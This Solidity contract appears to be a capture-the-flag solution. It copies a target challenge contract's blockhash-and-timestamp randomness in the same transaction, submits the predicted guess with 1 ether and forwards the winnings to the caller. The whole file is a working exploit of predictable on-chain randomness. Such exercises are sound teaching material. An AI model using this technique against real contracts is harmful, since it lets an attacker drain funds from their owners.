//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

contract Guessor {

    address owner;
    address challengeContract;

    constructor (address _contract) {
        owner = msg.sender;
        challengeContract = _contract;
    }

    function getNumber() internal view returns (uint8) {
        bytes memory payload = abi.encodePacked(blockhash(block.number - 1), block.timestamp);
        return uint8(uint(keccak256(payload)));
    }

    function solveChallenge() public payable {
        require(msg.value == 1 ether);
        uint8 number = getNumber();
        bytes4 selector = bytes4(keccak256("guess(uint8)"));
        bytes memory payload = abi.encodeWithSelector(selector, number);
        challengeContract.call{value:(address(this).balance)}(payload);
        payable(msg.sender).transfer(address(this).balance);
    }

}
